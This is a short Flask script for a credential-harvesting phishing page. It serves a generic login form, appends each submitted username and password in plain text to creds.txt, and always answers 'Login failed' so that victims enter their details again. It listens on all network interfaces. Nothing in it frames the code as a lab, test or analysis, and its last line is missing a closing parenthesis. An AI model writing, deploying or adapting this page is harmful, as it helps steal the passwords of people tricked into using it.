from flask import Flask, request, render_template_string

app = Flask(__name__)

html_page = """
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <h2>Login to Your Account</h2>
    <form method="post">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        with open("creds.txt", "a") as f:
            f.write(f"Username: {request.form['username']}, Password: {request.form['password']}\n")
        return "Login failed. Please try again."
    return render_template_string(html_page)

app.run(host="0.0.0.0", port=5000
